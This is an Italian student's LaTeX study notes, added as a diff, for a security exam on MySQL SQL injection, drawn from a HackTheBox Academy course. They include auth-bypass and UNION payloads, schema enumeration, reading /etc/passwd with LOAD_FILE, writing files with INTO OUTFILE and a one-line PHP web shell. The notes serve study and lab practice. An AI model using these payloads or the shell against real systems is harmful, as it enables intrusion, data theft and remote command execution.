@@ -1,0 +1,434 @@
+\documentclass[12pt,a4paper]{article}
+\usepackage[utf8]{inputenc}
+\usepackage[T1]{fontenc}
+\usepackage{lmodern}
+\usepackage[italian]{babel}
+\usepackage[margin=2.5cm]{geometry}
+\usepackage{hyperref}
+\usepackage{listings}
+\usepackage{xcolor}
+\usepackage{tcolorbox}
+\tcbuselibrary{skins,breakable}
+
+% Definizione colori per il codice
+\definecolor{codegray}{rgb}{0.95,0.95,0.95}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{keywordcolor}{rgb}{0.13,0.13,0.6}
+
+\hypersetup{
+	colorlinks=true,
+	linkcolor=keywordcolor,
+	filecolor=magenta,      
+	urlcolor=codepurple,
+	pdftitle={Security Exam Toolkit},
+}
+
+\lstset{
+	backgroundcolor=\color{codegray},
+	basicstyle=\ttfamily\small,
+	breaklines=true,
+	frame=single,
+	keepspaces=true,
+	showstringspaces=false,
+	upquote=true,
+	commentstyle=\color{codepurple},
+	keywordstyle=\color{keywordcolor}\bfseries,
+}
+
+% Stile personalizzato per le NOTE
+\newtcolorbox{nota}[1][NOTA]{
+	enhanced,
+	breakable,
+	arc=3pt,
+	boxrule=0pt,
+	colback=yellow!15,
+	borderline west={4pt}{0pt}{orange!80!red},
+	left=8pt,
+	top=4pt,
+	bottom=4pt,
+	fonttitle=\bfseries,
+	coltitle=orange!70!black,
+	title=#1,
+	attach title to upper=\quad
+}
+
+\title{\textbf{Struttura e Appunti: Security Exam Toolkit}}
+\author{Note Esame}
+\date{\today}
+
+\begin{document}
+	\maketitle
+	\tableofcontents
+	\newpage
+	
+	\section{00 Recon and Utils}
+	\textit{In questa cartella sono presenti script e tool utili all'enumerazione (es. auto\_enum.sh).}
+	
+	\section{01 Web Security}
+	
+	\subsection{SQL Injection}
+	
+	Metto qui solo e soltanto le cose che ritengo importanti a risolvere gli esercizi riguardanti le SQLi e alla compilazione del relativo report.
+	
+	\subsubsection{SQL Basics (MySQL)}
+	Sia il corso di HTB che quello in università si basa su MySQL (nota: MariaDB è un fork di MySQL, quindi se vedi quello vai tranquillo). 
+	
+	\paragraph{Basi SQL e Sintassi (per sicurezza)}
+	Giusto per avere un recap e non bloccarmi su cavolate di sintassi:
+	\begin{itemize}
+		\item \textbf{SELECT:} \texttt{SELECT column1, column2 FROM table\_name WHERE condition;}
+		\item \textbf{INSERT:} \texttt{INSERT INTO table\_name (column1, column2) VALUES (value1, value2);}
+		\item \textbf{UPDATE:} \texttt{UPDATE table\_name SET column1 = value1 WHERE condition;}
+		\item \textbf{DELETE:} \texttt{DELETE FROM table\_name WHERE condition;}
+		\item \textbf{ALTER:} \texttt{ALTER TABLE table\_name ADD column\_name datatype;} o \texttt{DROP COLUMN column\_name;}
+		\item \textbf{DROP:} \texttt{DROP TABLE table\_name;} o \texttt{DROP DATABASE database\_name;}
+	\end{itemize}
+	
+	\textbf{Ordine di valutazione degli operatori:}\\
+	L'ordine in SQL è fondamentale per capire come vengono valutati i nostri payload. In genere:
+	\begin{enumerate}
+		\item Parentesi \texttt{()} (sempre valutate per prime, fondamentali per bypass/injection mirate)
+		\item Moltiplicazione/Divisione \texttt{*}, \texttt{/}
+		\item Addizione/Sottrazione \texttt{+}, \texttt{-}
+		\item Operatori di confronto \texttt{=}, \texttt{>}, \texttt{<}, \texttt{>=}, \texttt{<=}, \texttt{<>}, \texttt{LIKE}, \texttt{IN}, \texttt{IS NULL}
+		\item \texttt{NOT}
+		\item \texttt{AND}
+		\item \texttt{OR}
+	\end{enumerate}
+	\begin{nota}
+		L'\texttt{AND} ha la precedenza sull'\texttt{OR}. Se scrivo \texttt{A AND B OR C}, viene valutato come \texttt{(A AND B) OR C}. Per forzare una priorità diversa servono le parentesi: \texttt{A AND (B OR C)}.
+	\end{nota}
+	
+	\paragraph{Command line login}
+	Posto di aver scoperto durante l'enumerazione (nmap) che c'è una porta aperta che espone il database MySQL, e posto di aver trovato altrove delle credenziali valide (teoricamente si può fare brute forcing, ma per questioni di tempo dubito fortemente che in esame sarà il caso), allora si può accedere al DB MySQL mediate un comando del tipo:
+	\begin{lstlisting}[language=bash]
+		mysql -u USER -h HOST_IP -P HOST_PORT -p
+	\end{lstlisting}
+	Il -p serve ad indicare la password, ma viene lasciato vuoto per evitare che essa appaia in chiaro su .bash\_history (o come si chiama): la password verrà quindi chiesta una volta lanciato il comando.
+	
+	\paragraph{Il Punto e Virgola}
+	Importante ricordare che una query è sempre terminata da un punto e virgola. Tuttavia questo non vale nel caso di \textit{[Testo originale interrotto]}
+	
+	\paragraph{Gli Apici}
+	MySQL permette i numeri con gli apici facendo un cast automatico. A livello pratico: se il parametro è palesemente numerico (es: ?id=5) prova prima i payload senza apici (es: 5 OR 1=1); se è una stringa (es: ?user=admin) l'apice ci vuole.
+	
+	\paragraph{Database e Schema}
+	Di base funziona così: un DBMS contiene diversi Schema (schemi), che a loro volta contengono diverse Table (tabelle). Per qualsivoglia motivo in MySQL hanno deciso di rendere DATABASE un sinonimo di SCHEMA, il che implica che alcuni comandi a noi utili hanno più versioni corrette. Un esempio è sicuramente:
+	\begin{lstlisting}[language=SQL]
+		SHOW DATABASES;
+		SHOW SCHEMAS;
+	\end{lstlisting}
+	
+	\paragraph{I Metacaratteri e l'operatore LIKE}
+	Di nuovo, giusto per non confonderci le idee, invece di * e ? abbiamo \% e \_ . Inoltre, si usano solamente con l'operatore LIKE (es: WHERE id = '5' AND user LIKE '\%admin\%').
+	
+	\subsubsection{Le SQL Injection}
+	
+	\paragraph{Le categorie}
+	Le SQLi si dividono in:
+	\begin{itemize}
+		\item \textbf{In-band} $\rightarrow$ Ovvero se l'output della query ci è direttamente visibile. Si dividono a loro volta in Error Based e Union Based (vedremo poi che vuol dire).
+		\item \textbf{Blind} $\rightarrow$ Ovvero se l'input non è direttamente visibile ma è ottenibile mediante logica SQL (in particolare a seconda dei casi si parla di Boolean Based o di Time Based).
+		\item \textbf{Out-of-band} $\rightarrow$ Ovvero se non c'è modo di vedere direttamente l'output, e va quindi rediretto ad una locazione remota (es DNS record) per cercare di recuperarlo. 
+	\end{itemize}
+	Fino a prova contraria, per fortuna noi ci occuperemo solo delle In-band, sia Error Based che Union Based.
+	
+	\paragraph{L'URL Encoding}
+	L'URL encoding (o percent-encoding) serve per codificare i caratteri speciali in modo che non "rompano" la richiesta HTTP (es. gli spazi, i \texttt{\&}, gli \texttt{=}). Regola d'oro: quando l'injection avviene via GET (nell'URL), i caratteri speciali devono essere codificati.
+	
+	Esempi rapidi:
+	\begin{itemize}
+		\item Spazio $\rightarrow$ \texttt{\%20} o \texttt{+}
+		\item \texttt{'} (apice singolo) $\rightarrow$ \texttt{\%27}
+		\item \texttt{\#} $\rightarrow$ \texttt{\%23}
+		\item \texttt{-- } (commento con spazio) $\rightarrow$ \texttt{--\%20}
+	\end{itemize}
+	Dato che la parte sull'url encoding (e anche l'aggiramento dei filtri) è comune a tutta la web security e non solo alle SQLi, magari qui facciamo un accenno e spieghiamo meglio in un file a parte.
+	
+	\subsubsection{SQLi - Error Based}
+	La prima cosa da fare è verificare se la query è vulnerabile, o meglio se il codice (es: PHP) è stato scritto in modo poco sicuro, rendendo la query vulnerabile. Non abbiamo accesso al codice, ma il modo più semplice per fare ciò è provare a mettere in un campo alla volta un singolo apice ' (o anche " o \textbackslash{} a quanto mi pare di capire). Il o i campi vulnerabili saranno quelli che causano un comportamento inatteso (es: qualcosa di diverso da login success/login fail in caso di login); il motivo è che usando MySQL gli apici, in mancanza di operazioni di "pulizia" dell'input la query diventa qualcosa del tipo: 
+	\begin{lstlisting}[language=SQL]
+		SELECT * FROM credentials WHERE user = ''' AND password = '';
+	\end{lstlisting}
+	I 3 apici sono un errore sintattico, e questo è il motivo per cui si otterrà un comportamento non standard (se non addirittura il traceback dell'errore, che da degli insight riguardo all'effettivo codice!!!).
+	
+	Al di la del fatto che mettendo un numero pari di apici non c'è più errore sintattico (informazione di zero utilità pratica imo), le due varianti che vedremo consistono nello sfruttare il fatto che dopo il singolo apice stiamo scrivendo direttamente dentro la query per manipolare quest'ultima (aggiungendo o togliendo parti di essa).
+	
+	Osservazione: il modo più facile a mio parere di non sbagliarsi con gli apici è scrivere la query (o eventualmente la presunta query) completa, e poi copiare la parte da incollare nell'url o nel form html. Esempio:
+	\begin{lstlisting}[language=SQL]
+		SELECT * FROM credentials WHERE user = 'admin' -- ' AND password = '';
+	\end{lstlisting}
+	Il payload che ci serve sarà "admin' -- ".
+	
+	Premessa: baserò la spiegazione sulla query di login già vista come esempio, dato che la tipologia e difficoltà dovrebbe essere molto simile. Ciò non toglie però che in caso di query diverse e/o più complesse la cosa diventa meno banale (detto ciò, riguardandosi la sezione sull'ordine degli operatori e ragionando un po' sulla logica dovrebbe essere più che fattibile).
+	
+	\paragraph{OR Injection}
+	// Questa injection viene usata quando si conosce un valore valido (e per noi rilevante) di uno dei campi vulnerabili (ripeto, questo criterio vale solo per query simili, ovvero con un unico AND ecc.).\\
+	Partiamo dalla query di login:
+	\begin{lstlisting}[language=SQL]
+		SELECT * FROM credentials WHERE user = 'user_fornito' AND password = 'password_fornita';
+	\end{lstlisting}
+	Ponendo per esempio che ci sia un utente con campo user "admin", il payload che si va ad immettere è il seguente:
+	\begin{lstlisting}[language=SQL]
+		admin' OR '1'='1
+	\end{lstlisting}
+	La query risultante sarà dunque: 
+	\begin{lstlisting}[language=SQL]
+		SELECT * FROM credentials WHERE user = 'admin' OR '1'='1' AND password = 'password';
+	\end{lstlisting}
+	OCCHIO che il motivo per cui funziona è l'ordine di valutazione degli operatori:
+	\begin{enumerate}
+		\item \texttt{'1'='1' AND password = 'password'} $\rightarrow$ FALSE sempre
+		\item \texttt{user = 'admin' OR FALSE} $\rightarrow$ TRUE per la riga dell'user 'admin', FALSE altrove.
+	\end{enumerate}
+	Quindi la query avrà risultato la riga della tabella credentials dove user = 'admin', bypassando il campo password! 
+	
+	\begin{nota}[IMPORTANTE:]
+		Se invece di avere come unico campo vulnerabile user abbiamo anche password, allora non è più necessario conoscere l'user di un utente!\\
+		Inoltre, l'injection è praticamente la stessa di prima ma duplicata, in quanto basta mettere come payload di entrambi i campi questo:
+		\begin{lstlisting}[language=SQL]
+			' OR '1'='1
+		\end{lstlisting}
+		La query risultante sarà dunque: 
+		\begin{lstlisting}[language=SQL]
+			SELECT * FROM credentials WHERE user = '' OR '1'='1' AND password = '' OR '1'='1';
+		\end{lstlisting}
+		Seguiamo dunque l'ordine degli operatori:
+		\begin{enumerate}
+			\item \texttt{'1'='1' AND password = ''} $\rightarrow$ FALSE sempre
+			\item \texttt{user = '' OR FALSE} $\rightarrow$ FALSE sempre
+			\item \texttt{FALSE OR '1'='1'} $\rightarrow$ TRUE sempre
+		\end{enumerate}
+	\end{nota}
+	
+	\begin{nota}
+		Nel secondo caso la query restituisce tutte le righe, ma le web app di solito processano solo la prima restituita dal DBMS, che solitamente è l'admin.
+	\end{nota}
+	
+	\paragraph{Comment Injection}
+	\begin{nota}
+		Questo tipo di SQLi in realtà mi pare più semplice della OR Injection, quindi magari può essere opportuno scambiarne l'ordine qui (scambiando probabilmente in questo modo l'ordine in cui vengono tentate).
+	\end{nota}
+	
+	Questo è il metodo più semplice e pulito di di fare gran parte delle SQLi (es: auth bypass): commentare la seconda parte della query!\\
+	Con un semplice payload del tipo:
+	\begin{lstlisting}[language=SQL]
+		admin'-- 
+	\end{lstlisting}
+	I ottiene una query del tipo:
+	\begin{lstlisting}[language=SQL]
+		SELECT * FROM credentials WHERE user = 'admin'-- ' AND password = 'something';
+	\end{lstlisting}
+	Ma in realtà la parte veramente eseguita è:
+	\begin{lstlisting}[language=SQL]
+		SELECT * FROM credentials WHERE user = 'admin';
+	\end{lstlisting}
+	
+	\begin{nota}
+		Nelle SQLi via web non serve mettere il ; perchè a backend la query viene gestita come un blocco singolo. Inserire il ; via web spesso causa errori, ha senso metterlo solo se si è collegati da riga di comando.
+	\end{nota}
+	
+	\begin{nota}
+		Da notare che:
+		\begin{enumerate}
+			\item Si può usare anche \# come commento oltre a --
+			\item Spesso non viene notato, ma lo spazio dopo -- è fondamentale! Infatti per chiarezza e per evitare eventuali trim() dell'input o problemi nell'URL encoding si tende a scrivere '-- -' piuttosto che solo '-- '.
+		\end{enumerate}
+	\end{nota}
+	
+	\begin{nota}
+		Chiaramente l'efficacia di questo metodo dipende dalla struttura della query e da quanto sappiamo su di essa: per esempio, se i campi user e password fossero invertiti il commento andrebbe ad eliminare:
+		\begin{itemize}
+			\item In un caso (vulnerabilità nel campo user) niente: \texttt{SELECT * FROM credentials WHERE password = 'something' AND user = 'admin'-- ';}
+			\item Nell'altro caso (vulnerabilità nel campo password) andrebbe comunque ad eliminare il campo user, che è quello che ci serve: \texttt{SELECT * FROM credentials WHERE password = 'something'-- ' AND user = 'admin';}
+		\end{itemize}
+		TUTTAVIA, se conosciamo la struttura della query in se possiamo aggirare il problema, almeno nel secondo caso:
+		\begin{lstlisting}[language=SQL]
+			SELECT * FROM credentials WHERE password = 'something' AND user = 'admin'-- ' AND user = 'admin';
+		\end{lstlisting}
+	\end{nota}
+	
+	Da notare che MySQL permette l'utilizzo delle parentesi tonde, per esempio all'interno delle clausole WHERE. Per esempio:
+	\begin{lstlisting}[language=SQL]
+		SELECT * FROM credentials WHERE (user = 'user_fornito' AND id > '0') AND password = 'password_fornita';
+	\end{lstlisting}
+	Il problema sta nel fatto che se semplicemente commentiamo, la parentesi aperta ma non chiusa causa un errore di sintassi. Questo è facilmente risolvibile semplicemente chiudendo la parentasi prima del commento:
+	\begin{lstlisting}[language=SQL]
+		SELECT * FROM credentials WHERE (user = 'user_valido')--  AND id > '0') AND password = 'something';
+	\end{lstlisting}
+	Da notare che questo non solo ci permette di fare login senza password di un qualsiasi utente valido, ma permette anche di, posto che 'admin' abbia id = '0', fare il login come admin!
+	
+	\subsubsection{SQLi - Union Based}
+	Questo tipo di injection si basa appunto sulla UNION, che permette di fare più SELECT e unire poi i risultati in una sola vista.
+	
+	\paragraph{Numero di Colonne}
+	Di base UNION lavora solo con select aventi lo stesso numero di colonne, quindi:
+	\begin{itemize}
+		\item Se le due query ritornano già lo stesso numero di colonne allora perfetto, siamo pronti.
+		\item Se le due query NON ritornano lo stesso numero di colonne, bisogna:
+		\begin{itemize}
+			\item Se è la query aggiunta da noi ad avere meno colonne, aggiungiamo colonne fantoccio.
+			\item Se è la query iniziale ad avere meno colonne, dobbiamo modificare la query aggiunta da noi diminuendo il numero di colonne restituite.
+		\end{itemize}
+	\end{itemize}
+	
+	\paragraph{Column Enumeration}
+	Per poter effettuare la Union Based SQLi bisogna prima quindi capire quante colonne ha la tabella iniziale. Ci sono 2 metodi totalmente analoghi tra loro:
+	\begin{itemize}
+		\item \textbf{ORDER BY:} Usando un payload del tipo \texttt{"' order by X-- -"} (dove X è il numero della colonna da usare per l'ordinamento) in modo incrementale partendo da X=1, se la query fallisce per X=k allora il numero di colonne sarà k-1.
+		\item \textbf{UNION:} Analogamente, basta un payload del tipo \texttt{"' UNION SELECT NULL, NULL, NULL-- -"}, dove il numero di NULL aumenta in modo incrementale da X=1 a X=k (dove la query fallisce), rivelando anche qui che il numero di colonne sarà k-1.
+	\end{itemize}
+	\begin{nota}
+		Il NULL va usato sempre all'inizio come jolly per contare le colonne senza che la query fallisca per errori di tipo di dato. Trovato il numero corretto, si passa ai numeri interi (UNION SELECT 1,2,3) per vedere quali colonne sono effettivamente mostrate a frontend.
+	\end{nota}
+	
+	\subsection{Exploitation}
+	Vediamo ora il workflow da usare per exploitare una vulnerabilità in un DBMS MySQL.
+	
+	\paragraph{È MySQL?}
+	Per capire se ci troviamo davanti ad un DBMS MySQL, i segni solitamente sono:
+	\begin{itemize}
+		\item Una porta la cui descrizione è letteralmente MySQL (o MariaDB).
+		\item Una porta la cui descrizione indica un server HTTP che è Apache o Nginx (dato che implica macchina linux, che a sua volta implica con grande probabilità MySQL).
+		\item Una porta la cui descrizione indica un server HTTp che è ISS e sappiamo la macchina essere Mycrosoft (?).
+	\end{itemize}
+	Al di la di questo, in caso di Union Based SQLi basta mettere come query una variante (coi NULL aggiunti ecc) di:
+	\begin{lstlisting}[language=SQL]
+		SELECT @@version;
+	\end{lstlisting}
+	Questa query funziona unicamente su MySQL, quindi da la certezza. Detto tutto ciò è improbabile che metta qualcosa che non sia MySQL, quindi diciamo che al massimo può essere una cosa in più da mettere nel report per fare bella figura.
+	
+	\subsubsection{L'Enumerazione del DBMS con Information\_Schema}
+	Questo Schema di sistema contiene informazioni come:
+	\begin{itemize}
+		\item Lista degli Schema presenti.
+		\item Lista delle Tables in ciascuno Schema.
+		\item Lista delle Columns in ciascuna Table.
+	\end{itemize}
+	\begin{nota}
+		Per selezionare le Table di uno Schema anche se un'altro Schema è "selezionato" si usa la seguente notazione:
+		\begin{lstlisting}[language=SQL]
+			SELECT * FROM SchemaX.TableY;
+		\end{lstlisting}
+	\end{nota}
+	
+	\paragraph{Schemata}
+	Tabella che contiene le informazioni riguardo tutti gli Schema presenti nel DBMS. Possiamo fare quindi enumerazione degli Schema con una query di questo tipo:
+	\begin{lstlisting}[language=SQL]
+		SELECT schema_name FROM information_schema.schemata;
+	\end{lstlisting}
+	
+	Inoltre, possiamo capire qual'è lo schema attualmente selezionato mediante 'database()':
+	\begin{lstlisting}[language=SQL]
+		SELECT database();
+	\end{lstlisting}
+	
+	\paragraph{Tables}
+	Una volta trovato uno Schema che ci interessa, che chiameremo SchemaX, andiamo a fare l'enumerazione delle Tables in quello Schema mediante la tabella Tables dentro ad Information\_Schema:
+	\begin{lstlisting}[language=SQL]
+		SELECT table_name FROM information_schema.tables WHERE table_schema = 'SchemaX';
+	\end{lstlisting}
+	
+	\paragraph{Columns}
+	Analogamente, avendo trovato una Table che ci interessa (che chiameremo TableY) andiamo a fare l'enumerazione delle Columns in quella Table mediante la tabella Columns dentro ad Information\_Schema:
+	\begin{lstlisting}[language=SQL]
+		SELECT column_name FROM information_schema.columns WHERE table_schema = 'SchemaX' AND table_name = 'TableY';
+	\end{lstlisting}
+	
+	\paragraph{Data}
+	Una volta ottenuti Schema, Table e Columns possiamo procedere all'estrazione dei dati che ci interessano veramente, con una query del tipo:
+	\begin{lstlisting}[language=SQL]
+		SELECT Campo1, Campo2 FROM SchemaX.TableY;
+	\end{lstlisting}
+	\begin{nota}
+		Ricorda sempre la notazione SchemaX.TableY, dato che lo Schema selezionato è un altro!!!
+	\end{nota}
+	\begin{nota}
+		Tutte le query da Exploitation in poi in realtà sono solo per esprimere il concetto, le vere query dovrebbero essere con UNION ecc.
+	\end{nota}
+	
+	\subsubsection{Lettura di File}
+	Poter leggere i dati all'interno di un DBMS, soprattutto al giorno d'oggi, è in realtà tutt'altro che scontato: solitamente, solo i DB Admin hanno i privilegi necessari.
+	
+	\paragraph{I Privilegi}
+	Iniziamo subito provando a vedere il nostro user corrente, usando una delle seguenti query (ovviamente adattate a UNION):
+	\begin{lstlisting}[language=SQL]
+		SELECT user();
+		SELECT user from mysql.user;
+	\end{lstlisting}
+	Ottenuto l'utente, possiamo verificare se esso ha i privilegi da DB Admin:
+	\begin{lstlisting}[language=SQL]
+		SELECT super_priv FROM mysql.user WHERE user = 'root';
+	\end{lstlisting}
+	Alternativamente, possiamo ottenere una lista forse più completa (?) dei nostri privilegi dall'Information\_Schema:
+	\begin{lstlisting}[language=SQL]
+		SELECT grantee, privilege_type FROM information_schema.user_privileges WHERE grantee = "'root'@'localhost'";
+	\end{lstlisting}
+	\begin{nota}
+		root@localhost non è nulla di strano, è letteralmente quello che esce da SELECT user();
+	\end{nota}
+	\begin{nota}
+		Il privilegio di leggere i file è indicato come Privilege\_Type = 'FILE'.
+	\end{nota}
+	
+	\paragraph{Load\_File}
+	Una volta che sappiamo che possiamo leggere i file, possiamo provare a leggere dei file sensibili, come /etc/passwd:
+	\begin{lstlisting}[language=SQL]
+		SELECT Load_File('/etc/passwd');
+	\end{lstlisting}
+	Un'altro esempio possibile è stampare a schermo il codice sorgente del webserver, anche se si può fare in casi molto particolari che non penso vedremo in esame. Per sempio, un webserver apache salva le pagine in /var/www/html, quindi se la pagina è index.html possiamo fare:
+	\begin{lstlisting}[language=SQL]
+		SELECT Load_File('/var/www/html/index.php');
+	\end{lstlisting}
+	\begin{nota}
+		In tal caso, il codice di index.php viene renderizzato dal browser, quindi bisogna usare CTRL+U per vedere il codice sorgente.
+	\end{nota}
+	
+	\subsubsection{Scrittura di File}
+	Per scrivere dentro a dei file nel backend server di un DBMS non basta il privilegio FILE, ma serve altro.
+	
+	\paragraph{Secure\_File\_Priv}
+	Questa variabile dice se e dove ho privilegi di lettura/scrittura: NULL $\rightarrow$ Da nessuna parte, Vuota $\rightarrow$ ovunque, Una/certa/dir $\rightarrow$ Solo in quella dir. Ovviamente tutto ciò posto di avere il privilegio FILE. 
+	I DBMS moderni ormai la settano su NULL o su percorsi blindati di default, rendendo questa vulnerabilità molto più rara in contesti reali aggiornati.
+	\begin{lstlisting}[language=SQL]
+		SELECT Variable_Name, Variable_Value FROM Information_Schema.Global_Variables WHERE Variable_Name="Secure_File_Priv";
+	\end{lstlisting}
+	
+	\paragraph{SELECT INTO OUTFILE}
+	Posto di aver verificato di avere i privilegi corretti, possiamo scrivere su dei file mediante una SELECT diversa dalla SELECT FROM:
+	\begin{lstlisting}[language=SQL]
+		SELECT * FROM users INTO OUTFILE '/tmp/credentials';
+		SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+	\end{lstlisting}
+	\begin{nota}
+		Un eventuale file creato dalla query avrà come owner e group mysql.
+	\end{nota}
+	Mostro un esempio di utilizzo di questa select nella nostra Union Based SQLi, dato che può risultare non immediata:
+	\begin{lstlisting}[language=SQL]
+		' UNION SELECT 1,'file written successfully!',3,4 INTO OUTFILE '/var/www/html/proof.txt'-- -
+	\end{lstlisting}
+	\begin{nota}
+		In realtà vengono scritti anche i numeri 1 3 4 insieme alla stringa voluta, quindi se si volesse un output pulito si metterebbero stringhe vuote "" al posto dei numeri.
+	\end{nota}
+	
+	\paragraph{Generare una Shell}
+	Posto che abbiamo detto che probabilmente casi del genere non ci capiteranno mai in esame, il corso di HTB propone un ultima cosa, ovvero di scrivere in un file PHP la seguente stringa:
+	\begin{lstlisting}[language=PHP]
+		<?php system($_REQUEST[0]); ?>
+	\end{lstlisting}
+	Questo, posto come nell'esempio di Load\_File() di conoscere il path dove vengono salvate le pagine del webserver, permette di lanciare qualsiasi comando shell mediante un URL del tipo:
+	\begin{lstlisting}[language=bash]
+		http://SERVER_IP:PORT/shell.php?0=COMANDO
+	\end{lstlisting}
+	\begin{nota}
+		Lo '0=' prima del comando è perchè la shell prende come input il parametro 0.
+	\end{nota}
+	
+	\begin{nota}[NOTA FINALE:]
+		La fonte di questo file è il corso gratuito HTB che trovate al link https://academy.hackthebox.com/app/module/33. Tale corso include anche una sezione sul come evitare le SQLi ed un caso d'uso reale molto interessante che però comprende anche un utilizzo avanzato di Burp Suite; ho tralasciato tali sezioni in quanto questo documento è volto allo svolgimento dell'esame.
+	\end{nota}
+	
+	\subsection{Command Injection}
+	\textit{In questa sezione andranno inseriti gli appunti o i riferimenti per la Command Injection.}
+	
+\end{document}
